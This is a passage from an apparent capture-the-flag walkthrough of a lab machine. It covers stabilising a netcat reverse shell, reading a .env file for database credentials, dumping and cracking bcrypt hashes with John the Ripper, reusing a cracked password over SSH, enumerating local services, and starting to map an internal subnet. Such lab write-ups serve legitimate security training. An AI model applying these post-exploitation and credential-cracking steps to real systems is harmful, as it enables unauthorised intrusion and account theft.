- Outbound TCP to arbitrary attacker-controlled ports is unrestricted. No egress filtering interfered with the callback on port 4444.
- The shell has no controlling TTY, producing the `Inappropriate ioctl for device` and `no job control` warnings. Commands requiring a terminal — `su`, `ssh`, `sudo` with password prompt, full-screen editors — will fail until the shell is upgraded.

**Next:** Stabilise the shell to obtain a full TTY, then enumerate the application directory for stored credentials.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.3 Stabilize the shell

**Why this step:** The netcat shell has no controlling terminal, producing job-control errors and blocking any command that requires a TTY. Allocate a pseudo-terminal and reconfigure the local terminal to obtain a fully interactive session.

**Commands:**

In the reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press **Ctrl+Z** to background the session, then on the attacking host:

```bash
stty raw -echo; fg
```

Press Enter, then back in the shell:

```bash
export TERM=xterm
stty rows 50 columns 200
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`python3 -c '...'`|Executes a one-line Python program|Runs code without creating a file|
|`import pty; pty.spawn("/bin/bash")`|Allocates a pseudo-terminal and runs bash inside it|Gives the remote shell a real terminal device|
|**Ctrl+Z**|Suspends the foreground job|Puts netcat on hold so the local terminal can be reconfigured|
|`stty raw`|Disables local line buffering and signal interpretation|Passes every keystroke straight through instead of processing it|
|`-echo`|Stops the local terminal echoing typed characters|Prevents each keystroke appearing twice|
|`fg`|Resumes the suspended job|Brings netcat back to the foreground|
|`export TERM=xterm`|Declares the terminal type to the remote shell|Lets full-screen programs draw correctly|
|`stty rows 50 columns 200`|Sets the remote terminal dimensions|Stops long lines wrapping in the wrong place|

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

darkzero@SRV01:~$ export TERM=xterm
darkzero@SRV01:~$ stty rows 50 columns 200
darkzero@SRV01:~$
```

**What this gives you:** A fully interactive TTY session.

**Key findings:**

- Tab completion, command history, and Ctrl+C now function correctly within the remote shell rather than affecting the local listener.
- Commands requiring a controlling terminal — `su`, `ssh`, interactive password prompts, full-screen editors — will now work. This matters directly: later phases require `ssh` and `ksu`, both of which read from `/dev/tty` and fail on an unstabilised shell.
- `python3` is present on the target, which also indicates a scripting interpreter is available for later post-exploitation work.

<div align="center"> <br> <br> </div>

##### Why a netcat shell is not a terminal

A shell obtained through netcat is bash reading from and writing to a network socket. A socket is not a terminal, and a great deal of Unix behaviour quietly assumes a terminal exists.

A pseudo-terminal (PTY) is a kernel-provided device pair that emulates a physical terminal. It handles line editing, translates Ctrl+C into a SIGINT signal for the foreground process group, tracks window dimensions, and supports the `ioctl` calls that programs use to query terminal state. Without one, `bash` reports `Inappropriate ioctl for device` — it asked the kernel about a terminal that is not there.

The upgrade has two halves, and both are needed.

Remotely, `pty.spawn` creates a PTY and runs bash attached to it. Bash now has a proper terminal and job control works on the target side.

Locally, your own terminal is still in cooked mode: buffering input until Enter, echoing keystrokes, and capturing Ctrl+C for itself. With two terminals both processing input, keystrokes get handled twice and signals go to the wrong process. `stty raw -echo` disables all of it, reducing the local terminal to a transparent pipe so that only the remote PTY interprets anything.

If Python is unavailable, `script -qc /bin/bash /dev/null` allocates a PTY through the `script` utility instead. Where `socat` exists on both hosts it provides a fully-featured TTY in a single step, though it is rarely installed on targets by default.

**Next:** Enumerate the application directory for configuration files containing stored credentials.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.4 Enumerate the application directory

**Why this step:** A foothold exists as the web service account. Application service accounts commonly hold database credentials on disk. Enumerate `/opt` to locate the deployment and identify other software present on the host.

**Command:**

```bash
ls -la /opt/
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ls`|List directory contents|Shows what's in a folder|
|`-l`|Long format: permissions, owner, group, size, date|Shows who owns what and who can read it|
|`-a`|Include entries beginning with a dot|Reveals hidden files such as `.env`|
|`/opt/`|Conventional location for optional/third-party software|Where manually-deployed applications usually live|

**Result:**

```
total 24
drwxr-xr-x  6 root       root     4096 Jul 21 05:39 .
drwxr-xr-x 23 root       root     4096 Jul 20 13:13 ..
drwxrwxr-x  6 darkzero   darkzero 4096 Jul 14 06:10 DarkZero_Campaigns
drwxr-x---  4 svc-runner root     4096 May 20 23:36 gitea-runner
drwxr-xr-x  5 root       root     4096 Jul 21 05:38 sysinternalsEBPF
drwx------  2 root       root     4096 Jul 29 04:54 sysmon
```

**What this gives you:** The application root, plus evidence of two other systems on the host.

**Directory analysis:**

|Directory|Owner|Mode|Accessible as `darkzero`|Significance|Simple Explanation|
|---|---|---|---|---|---|
|`DarkZero_Campaigns`|darkzero|`drwxrwxr-x`|Read + write|The compromised web application|Our own app — full access|
|`gitea-runner`|svc-runner|`drwxr-x---`|**No**|Self-hosted Gitea Actions CI/CD runner|A build system that runs jobs as another user|
|`sysinternalsEBPF`|root|`drwxr-xr-x`|Read|Microsoft Sysinternals eBPF monitoring|Security monitoring, not a target|
|`sysmon`|root|`drwx------`|No|Microsoft Sysmon for Linux|Logs activity — assume actions are recorded|

**Key findings:**

- The application root is `/opt/DarkZero_Campaigns`, owned by `darkzero` and fully accessible from the current shell. Configuration files stored there are readable.
- **A Gitea Actions runner is installed at `/opt/gitea-runner`, owned by `svc-runner`.** The directory is unreadable from the current account, but its presence establishes that a self-hosted CI/CD runner executes jobs on this host as a distinct service account. CI/CD runners execute attacker-supplied workflow definitions with the runner account's privileges, making `svc-runner` a lateral-movement target.
- Gitea itself is not running from `/opt` — only the runner agent is present. The Gitea server is hosted elsewhere, presumably on the internal network the runner connects to.
- Microsoft Sysinternals tooling (`sysinternalsEBPF`, `sysmon`) is deployed on this Linux host. Sysmon for Linux records process creation, network connections, and file activity. This corroborates the Windows-centric environment inferred from the OS fingerprint in 2.1.3, and means post-exploitation activity is being logged.
- `svc-runner` and `root` are the only other local identities visible so far.

**Next:** Read the application's environment configuration for stored database credentials.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.5 Read the application environment configuration

**Why this step:** The web application connects to a database and therefore holds credentials on disk. Node.js deployments conventionally store secrets in a `.env` file at the project root, readable by the account the service runs as — the account already compromised.

**Command:**

```bash
cat /opt/DarkZero_Campaigns/.env
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`cat`|Print a file's contents to stdout|Show me what's in this file|
|`/opt/DarkZero_Campaigns/.env`|Environment configuration at the application root|Where Node apps keep their secrets|

**Result:**

```shell
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```

**What this gives you:** Cleartext database credentials and the application's session signing key.

**Configuration analysis:**

|Key|Value|Significance|Simple Explanation|
|---|---|---|---|
|`PORT`|`8081`|Node listens on 8081; nginx proxies port 80 to it|The app's real port, hidden behind the web server|
|`DB_HOST`|`localhost`|Database is on this host, not remote|MySQL runs here, not somewhere else|
|`DB_USER`|`darkzero`|Database account name|Login name for the database|
|`DB_PASSWORD`|`C4ntFindMyDMpass!`|**Cleartext database password**|The database password, in plain text|
|`DB_NAME`|`darkzero_campaigns`|Target schema|Which database to open|
|`SESSION_SECRET`|`DarkSession312#`|HMAC key signing the `dz.sid` cookie|The key that proves a session cookie is genuine|

**Key findings:**

- **Database credentials recovered in cleartext:** `darkzero : C4ntFindMyDMpass!` against schema `darkzero_campaigns` on localhost. No exploitation was required — the file is necessarily readable by the service account.
- The session signing secret `DarkSession312#` is also exposed. Possession of this key permits forging arbitrary `dz.sid` session cookies, allowing authentication as any application user without knowing their password. Not needed here since database access supersedes it, but it is a complete authentication bypass in its own right.
- `PORT=8081` confirms the architecture inferred during reconnaissance: nginx on port 80 reverse-proxies to a Node.js process bound to 8081. Only nginx is externally exposed.
- Both the database password and session secret are weak, human-chosen strings rather than generated values. Reference material for this target records placeholder values (`change_me`) in these fields; this instance carries real credentials.

<div align="center"> <br> <br> </div>

##### Why `.env` is the first file to read after any Node.js foothold

The application must authenticate to its database. That means a username and password exist somewhere the running process can read at startup — and "somewhere" is a short list.

Hardcoding credentials into source is the obvious wrong answer, because source goes into version control and gets shared. So the community converged on the environment-variable pattern: secrets live outside the code, injected into the process environment at launch. The `.env` file is how that is done in practice — a plain key=value file, loaded by a library called `dotenv`, and conventionally listed in `.gitignore` so it never reaches the repository.

Which produces a predictable outcome. The file is always at the project root, always named `.env`, always plaintext, and always readable by the account the app runs as — necessarily, or the app could not start. You are that account.

The same instinct applies across stacks: `config.php` and `wp-config.php` for PHP, `settings.py` or `local_settings.py` for Django, `application.properties` for Java, `appsettings.json` for .NET.

More broadly, the reasoning is: _what must this process know in order to work, and where must that knowledge be stored?_ Anything a program needs at runtime is on disk somewhere, readable by whoever it runs as.

**Next:** Authenticate to the local MySQL instance with the recovered credentials and enumerate the users table for stored password hashes.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.6 Dump the application users table

**Why this step:** Cleartext database credentials were recovered from the application's environment file. Authenticate to the local MySQL instance and dump the users table to obtain stored password hashes.

**Command:**

```bash
mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "SELECT * FROM users;"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`mysql`|MySQL command-line client|The program that talks to the database|
|`-u darkzero`|Username from `DB_USER`|Who to log in as|
|`-p'C4ntFindMyDMpass!'`|Password from `DB_PASSWORD`, single-quoted|The password. Quotes are required — `!` triggers bash history expansion unquoted|
|`-h localhost`|Host from `DB_HOST`|Connect to the database on this machine|
|`-D darkzero_campaigns`|Schema from `DB_NAME`|Which database to open|
|`-e "SELECT * FROM users;"`|Execute a query and exit|Run one command instead of opening an interactive session|

**Note on identifying the engine:** the `.env` keys are generic and name no database product. The absence of a `DB_PORT` entry is the tell — MySQL clients default to 3306 without being told, whereas PostgreSQL deployments almost always cassrry an explicit `DB_PORT=5432`. The disciplined alternative is to check rather than infer: `ss -tlnp` shows 3306 for MySQL/MariaDB, 5432 for PostgreSQL, 27017 for MongoDB.

**Result:**

```shell
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username             | password_hash                                                | role   | created_at          |
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin                | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh                 | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | nedmoeca@nimbaya.com  | nedmoeca@nimbaya.com | $2b$10$4sBqCdavaqgfbMYVXYdH3Ogf.MBui68v9KDBNtF6K6opZrWFgPqSm | player | 2026-07-29 09:53:28 |
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
```

**What this gives you:** Password hashes for every application user.

**User analysis:**

|id|Username|Role|Created|Significance|Simple Explanation|
|---|---|---|---|---|---|
|1|`admin`|admin|2026-04-19|Application administrator, seeded with the box|Built-in admin account|
|3|`josh`|player|2026-05-19|A named individual, created separately from seed data|A real person's account — likely a real system user too|
|4|`nedmoeca@nimbaya.com`|player|2026-07-29|Account registered during this engagement|Ours; no value|

**Key findings:**

- Three password hashes recovered, all bcrypt in `$2b$10$` format. The `$2b$` prefix identifies bcrypt; `10` is the cost factor, meaning 2¹⁰ key-expansion rounds.
- **`josh` is the priority target.** The account is a named individual rather than a generic role, and was created a month after the seeded `admin`. Application usernames frequently correspond to operating-system or domain accounts, so cracking this hash may yield credentials reusable beyond the web application.
- Note the gap at `id = 2`. A row was deleted from this table at some point. The live database no longer holds it — but a backup taken before the deletion would.
- The `admin` hash is available but the role grants only application-level privileges already superseded by shell access. Deprioritised.
- `SELECT *` succeeded, confirming the `darkzero` database account has read access across the schema rather than restricted per-column grants.
<div align="center"> <br> <br> </div>

##### Reading a bcrypt hash, and why the format matters

A stored hash advertises its own algorithm. The string begins with a modular-crypt prefix identifying the scheme, and recognising it immediately narrows what tool and mode to use.

```
$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK
 └┬┘ └┬┘ └──────────────────────┬───────────────────────────┘
  │   │                          │
  │   │                          └─ 22-char salt + 31-char hash, Base64-encoded
  │   └─ cost factor: 2^10 = 1024 rounds
  └─ algorithm: bcrypt (2b = current revision)
```

Common prefixes worth memorising:

|Prefix|Algorithm|hashcat mode|
|---|---|---|
|`$2a$` / `$2b$` / `$2y$`|bcrypt|3200|
|`$1$`|MD5-crypt|500|
|`$5$`|SHA-256-crypt|7400|
|`$6$`|SHA-512-crypt|1800|
|`$argon2id$`|Argon2id|34000|
|32 hex chars, no prefix|Raw MD5|0|
|40 hex chars, no prefix|Raw SHA-1|100|

Bcrypt is deliberately slow. The cost factor is an exponent, so each increment doubles the work — cost 10 means 1024 rounds of key expansion per guess. On commodity hardware that translates to a few thousand guesses per second against bcrypt, versus billions per second against raw MD5.

The practical consequence is that bcrypt is only crackable when the password is weak. A wordlist attack against `rockyou.txt` will find `Rangers1` or `Summer2024`; it will not find a random 16-character string, and brute-forcing the keyspace is infeasible. So the decision to attempt a crack rests on a bet that the user chose something human — which, for a personal account on a hobby application, is a reasonable bet.

**Next:** Extract the target hash and attempt a dictionary attack.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.7 Crack josh's password hash

**Why this step:** The users table yielded bcrypt hashes for three accounts. `josh` is a named individual rather than a seeded role, making password reuse against system or domain accounts plausible. Attempt a dictionary attack against that hash alone.

**Commands:**

Write the hash to a file with its username, on the attacking host:

```bash
echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
```

Run the attack:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`echo '...' > josh.hash`|Write the hash to disk in `username:hash` format|Save the target. Single quotes are required — unquoted, bash expands `$2b` and `$10` as variables|
|`john`|John the Ripper password cracker|The cracking tool|
|`--format=bcrypt`|Declare the hash algorithm|Skips auto-detection and removes ambiguity|
|`--wordlist=...rockyou.txt`|Dictionary attack against ~14M real passwords|Try known human passwords rather than every possible string|
|`josh.hash`|Input file|What to crack|

Only josh's hash is loaded. Bcrypt salts are per-hash, so every additional hash in the file multiplies the work — each candidate password must be re-hashed against each distinct salt.

**Result:**

```shell
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.00% (ETA: 2026-07-30 10:22) 0g/s 157.1p/s 157.1c/s 157.1C/s caitlin..yamaha
Rangers1         (josh)
1g 0:00:02:52 DONE (2026-07-29 04:13) 0.005798g/s 156.7p/s 156.7c/s 156.7C/s babyboys..DAYANA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**What this gives you:** A cleartext credential pair for a named user.

**Key findings:**

- **Credentials recovered: `josh : Rangers1`.** Cracked in 2 minutes 52 seconds at approximately 157 candidates per second.
- Throughput doubles when cracking a single hash. An earlier run loading both `admin` and `josh` reported `71.48p/s` against `142.9c/s` — two crypt operations per candidate, because each bcrypt hash carries its own salt and a candidate must be hashed separately against each. Restricting the attack to the one hash that matters halves the runtime.
- `admin` was deliberately excluded. Its `admin` role confers application-level privileges only, already superseded by shell access on the host.
- The password is a weak dictionary word with a trailing digit, exactly the pattern bcrypt fails to protect against. Bcrypt's cost factor defends against exhaustive search, not against a password that appears in a public wordlist.
- John was preferred over hashcat here because its native input format is `username:hash` and it reports cracked results as `password (username)`, whereas hashcat treats usernames as an afterthought. For two bcrypt hashes the speed difference is irrelevant — both tools are bounded by the algorithm rather than the hardware.

<div align="center"> <br> <br> </div>

##### Why salt count dictates cracking time

An unsalted hash function computes one digest per input. Crack a thousand raw MD5 hashes and you hash each candidate password once, then compare the result against all thousand — the cost is independent of how many hashes you are attacking.

Salting removes that economy deliberately. Every bcrypt hash embeds a random 22-character salt, mixed into the key schedule before the password is processed. Two users with identical passwords produce entirely different hashes. To test one candidate against two hashes, the full 1024-round key expansion must run twice.

This is visible directly in John's status line:

```
71.48p/s    142.9c/s     ← two hashes: 2 crypts per candidate
156.7p/s    156.7c/s     ← one hash:  1 crypt per candidate
```

`p/s` counts candidate passwords tried; `c/s` counts crypt operations performed. When they match, one hash is loaded. When `c/s` is a multiple of `p/s`, that multiple is the number of distinct salts.

The operational rule follows: load only hashes you actually need. Every extra target is a proportional multiplier on wall-clock time, and against a deliberately slow algorithm that multiplier is expensive.

**Next:** Test the recovered credentials against SSH, since port 22 was identified as externally exposed during reconnaissance.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.8 Authenticate over SSH with recovered credentials

**Why this step:** Port 22 was exposed externally from the initial scan but unusable without credentials. The cracked application password may be reused for the system account of the same name.

**Command:**

```bash
ssh josh@TARGET_IP
```

Password: `Rangers1`

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ssh`|Secure Shell client|Log in to a remote machine|
|`josh@`|Username matching the cracked application account|Try the same name on the operating system|
|`TARGET_IP`|Host from the initial scan|The target machine|

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ ssh josh@10.129.41.240
The authenticity of host '10.129.41.240 (10.129.41.240)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:42: [hashed name]
    ~/.ssh/known_hosts:48: [hashed name]
    ~/.ssh/known_hosts:49: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.41.240' (ED25519) to the list of known hosts.
josh@10.129.41.240's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 30 02:02:28 PM UTC 2026

  System load:  0.0                Processes:             150
  Usage of /:   47.5% of 10.66GB   Users logged in:       0
  Memory usage: 64%                IPv4 address for eth0: 172.16.20.3
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

5 updates can be applied immediately.
5 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

josh@SRV01:~$ 
```

Search for the user flag:

```bash
josh@SRV01:~$ find / -name user.txt 2>/dev/null
josh@SRV01:~$
```

No results.

**What this gives you:** A stable, fully interactive session as a named user, and the internal network topology.

**Key findings:**

- **Password reuse confirmed.** `Rangers1` authenticates `josh` at both the application layer and the operating system. A credential recovered from a web application database granted direct SSH access.
- **SRV01 is dual-homed. Its internal address is `172.16.20.3` on `eth0`.** The externally-reachable HTB address is a separate interface. An entire internal subnet `172.16.20.0/24` exists that was invisible to external scanning — this is the pivot point into the rest of the environment.
- The host is Ubuntu 24.04.4 LTS on kernel 6.8.0-136, current enough that kernel-level privilege escalation is not a promising path.
- `user.txt` is not present anywhere on this filesystem. The user flag resides on a different host, confirming the engagement extends beyond SRV01.
- The session is a genuine SSH login with a controlling TTY, so no shell stabilisation is required. Interactive commands work directly.
- Outbound HTTPS fails (`Failed to connect to https://changelogs.ubuntu.com`), indicating the host has no direct internet egress. Tooling must be transferred from the attacking machine rather than downloaded.

**Next:** Enumerate listening services on SRV01, particularly those bound to loopback or the internal interface, which were unreachable from outside.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.9 Enumerate listening services on SRV01

knowing where to go next, and right now you don't. Everything you know about this machine came from scanning it _from outside_, and that view told you almost nothing: two open ports, SSH and a website. You've already used both. Neither has anything left to give you.

So the question is: what else is on this machine?

When a program offers a network service, it has to choose **who is allowed to connect to it**. That choice is made when it starts up, and there are two broad options.

It can listen on **`0.0.0.0`**, which means "any network card, I'll take connections from anywhere." A public website does this. It has to because strangers need to reach it.

Or it can listen on **`127.0.0.1`**, which is a special address meaning this machine, and only this machine. It's called **loopback**, and it's not a real network card — it's a shortcut inside the operating system where traffic goes out and comes straight back in without ever touching a wire. If a program listens on `127.0.0.1`, the kernel will physically refuse to route outside traffic to it. Not "reject the password" — refuse to connect at all.

The reason this is done is because it's good security. Take a database for example. The only thing that needs to talk to it is the website running on the same box. Nobody on the internet has any business connecting to it. So you bind it to loopback and now it is _unreachable_ from the network, no matter what.

Scanning a machine from outside cannot see loopback services. Not "might miss them" — _cannot_, by design. So our nmap scan from Kali wasn't wrong, it was just blind to an entire category of software. Every loopback service on this box was running the whole time and was invisible to you.

But you're not outside anymore. You're on the machine. From here, `127.0.0.1` means _here_. Everything that was hidden initially is now local.

There's a second category too, worth knowing about: a service can listen on `0.0.0.0` — wide open, from the software's point of view — and still be unreachable from outside because a **firewall** in front of the machine drops the traffic. Different mechanism, same result for a remote scanner, and the difference matters. A loopback service can only ever be reached from the box itself. A firewalled one is reachable from anything on the _internal_ network.

**So: after you get a shell anywhere, just list local services.** On boxes where the external surface is a dead end — like this one — it's likely where the path forward is hiding.

**Command:**

```bash
ss -tlnp
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ss`|Socket statistics utility, successor to `netstat`|Lists network connections and listeners|
|`-t`|TCP sockets only|Ignore UDP|
|`-l`|Listening sockets only|Show what's waiting for connections, not established ones|
|`-n`|Numeric output|Don't resolve port numbers to service names or IPs to hostnames|
|`-p`|Show owning process|Name the program behind each socket, where permissions allow|

**Result:**

```
State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port   Process
LISTEN   0        4096           127.0.0.54:53             0.0.0.0:*
LISTEN   0        511             127.0.0.1:8081           0.0.0.0:*
LISTEN   0        4096        127.0.0.53%lo:53             0.0.0.0:*
LISTEN   0        151             127.0.0.1:3306           0.0.0.0:*
LISTEN   0        4096              0.0.0.0:22             0.0.0.0:*
LISTEN   0        511               0.0.0.0:80             0.0.0.0:*
LISTEN   0        70              127.0.0.1:33060          0.0.0.0:*
LISTEN   0        4096                    *:41557                *:*
LISTEN   0        4096                 [::]:22                [::]:*
```

**What this gives you:** A complete inventory of services on the host, including those unreachable from outside.

**Listening service analysis:**

| Address:Port                        | Binding        | Service             | External? | Analysis                                             | Simple Explanation                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ----------------------------------- | -------------- | ------------------- | --------- | ---------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `127.0.0.1:8081`                    | Loopback       | Node.js application | No        | Matches `PORT=8081` from `.env`; nginx proxies to it | Loopback, so no outsider ever reached this. Recognise this? It was in the `.env` file you read back as `PORT=8081`. This is the Node.js web application itself. So how did your browser reach a website that only accepts local connections? Because nginx on port 80 took your request and passed it inward. That's what a **reverse proxy** does — it's the public face, and the actual app hides behind it. You already have code execution here, so nothing new. |
| `127.0.0.1:3306`                    | Loopback       | MySQL               | No        | Already accessed with credentials from `.env`        | MySQL's standard port. Loopback only, which is correct hardening: the database serves the app on the same machine and nobody else. You already got in with the credentials from `.env` and dumped josh's password hash out of it. Looted.                                                                                                                                                                                                                            |
| `127.0.0.1:33060`                   | Loopback       | MySQL X Protocol    | No        | Alternate MySQL interface, same instance             | Same MySQL server, second interface. Modern MySQL speaks two protocols: the classic one on 3306 and a newer "X Protocol" on 33060. Two doors, one room, and you've already been in the room.                                                                                                                                                                                                                                                                         |
| `127.0.0.54:53`, `127.0.0.53%lo:53` | Loopback       | systemd-resolved    | No        | Local DNS stub resolver                              | Port 53 is DNS, the service that turns names into IP addresses. Both are on loopback addresses, and Ubuntu ships with a small local DNS helper called `systemd-resolved` that answers on exactly these two. It doesn't resolve names itself; it forwards your questions to a real DNS server elsewhere and caches the answers. Completely standard, on every modern Ubuntu machine.                                                                                  |
| `0.0.0.0:22`, `[::]:22`             | All interfaces | OpenSSH             | Yes       | The SSH access already in use                        | SSH, on all interfaces. Two lines for one service because `0.0.0.0` covers IPv4 and `[::]` covers IPv6; the same sshd is handling both. This appeared in your external scan and it's how you're connected right now.                                                                                                                                                                                                                                                 |
| `0.0.0.0:80`                        | All interfaces | nginx               | Yes       | The web application front end                        | nginx. The other port from your external scan.                                                                                                                                                                                                                                                                                                                                                                                                                       |
That's eight lines accounted for, and every one of them is either something you already own or standard operating-system furniture. Which leaves one.

The line that matters:

| `*:41557` | **All interfaces** | **Unidentified** | **No** | Owner process not visible to `josh`; filtered externally | An unknown service run by another user |
| --------- | ------------------ | ---------------- | ------ | -------------------------------------------------------- | -------------------------------------- |

Three separate things are wrong with this line, and they compound.

**It's listening on `*`, meaning every interface.** Not loopback. This service is genuinely willing to accept connections from other machines on the network.

**It did not appear in our external nmap scan.** Go back and check: your scan which covers all 65,535 ports. 41647 is inside that range. The scan looked at this exact port and reported it filtered along with 65,532 others. So the service was open and the firewall dropped your packets. **The distinction matters:** if this were a loopback service, only SRV01 could ever talk to it. Because it's firewalled instead, anything on the _internal_ network can reach it — which tells you there is an internal network with things on it that expect to talk to this box.

**The Process column is empty.** Every other line is blank too, because `-p` needs elevated privileges to name most processes — but that's exactly the point. If this were josh's own program, you'd see the name regardless of privileges. You don't. **Something is running as a user that isn't you.**

Earlier we walked the filesystem and hit a directory you couldn't open: `/opt/gitea-runner`, owned by `svc-runner`. At the time it was just a locked door with an interesting name.

Now put the two together. There's a program you can't see, owned by a user who isn't you, sitting on a network port waiting for connections from other machines. And there's a directory belonging to `svc-runner` called `gitea-runner`.

Gitea is a self-hosted Git server — think a private GitHub you run yourself. A **runner** is the companion piece: an agent that sits on a machine and waits to be told "build this code," then builds it. That's why the port is random. The runner isn't a service people connect to by name, so it doesn't need a memorable fixed port; it grabs whatever's free at startup and reports it to its server.

So the shape of the situation is: **something on this machine is waiting to receive instructions from a Gitea server, and that server is not on this machine.** No Gitea is listening here — only the agent. The server has to be somewhere else, on a network you haven't seen yet.

**Two open questions you can't answer from this output:** where is that network, and what's on it.

**Key findings:**

- **An unidentified service listens on `*:41557`, bound to all interfaces.** No process name is shown, indicating it runs under a different user account. The port falls within the range covered by the initial full-port scan (2.1.1), yet did not appear in those results — so it is filtered while remaining reachable from within the internal network.
- The likely owner is the Gitea Actions runner identified at `/opt/gitea-runner` in 3.4. That directory is owned by `svc-runner` and unreadable from the current account, consistent with a socket whose process details are hidden.
- Every loopback-bound service is already understood and offers no new access. MySQL is looted, the Node app is compromised, and the DNS stubs are standard Ubuntu components.
- No Gitea server is listening on this host. Only the runner agent is present, so the Gitea instance itself is on another machine within `172.16.20.0/24`.
- The internal subnet is reachable from SRV01 via `172.16.20.3` but not from the attacking host. Access to any internal service requires tunnelling through this foothold.

<div align="center"> <br> <br> </div>

##### Why loopback services are the first post-foothold target

A service bound to `127.0.0.1` accepts connections only from the machine itself. The kernel will not route external traffic to it. This is a deliberate and correct hardening measure: a database that only its own application needs to reach has no business being exposed to the network.

The consequence for an attacker is that external scanning systematically underreports the attack surface. Nmap against the public address of this host returned two ports. `ss -tlnp` from inside returns nine sockets. Seven services existed the entire time, invisible.

More importantly, loopback services are frequently configured on the assumption that only trusted local processes can reach them. Authentication may be weak, absent, or trivially bypassed, because the network boundary was treated as the security boundary. Once code execution is obtained on the host, that assumption fails completely — and the services behind it are often softer than anything facing the internet.

The distinct case here is `*:41557`. It is bound to all interfaces, not loopback, so it _is_ network-accessible — just not from outside, because a firewall filters it at the perimeter. That is a different security model with the same practical result: reachable now, unreachable before.

Running `ss -tlnp` immediately after establishing any foothold is therefore not optional. It routinely surfaces the path forward on machines where the external surface is a dead end, and it costs one command.

**Next:** Enumerate the internal network to identify hosts and services within `172.16.20.0/24`.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.10 Map the internal network

There's something you may have seen earlier and probably didn't register it. When you logged in over SSH, the login banner printed the machine's IP addresses, and one of them was **`172.16.20.3`**. Your target's public address is the `10.129.x.x` one you've been attacking. So this box has two addresses, which means two network cards, which means it sits on two networks at once.

That's a **dual-homed host**, and it's an extremely common design. One card faces the outside world; the other faces a protected internal network. The whole point is that nobody outside can reach the internal side — the only path is _through_ the machine in the middle. Which you now control.

The reason why `172.16.20.3` is recognisably private. Three ranges of IP address are reserved for internal use and are never routable on the public internet: `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16`. Your home router hands out `192.168.x.x` for the same reason. Seeing `172.16.20.3` tells you immediately: internal network, not internet-facing.

The `/24` on the end of `172.16.20.0/24` is a **subnet mask**, and it's just saying how many addresses are in the neighbourhood. `/24` means the first three numbers are fixed and only the last one varies, so the network runs from `172.16.20.1` to `172.16.20.254` — 254 possible machines. You're `.3`. There's no reason to assume you're alone.

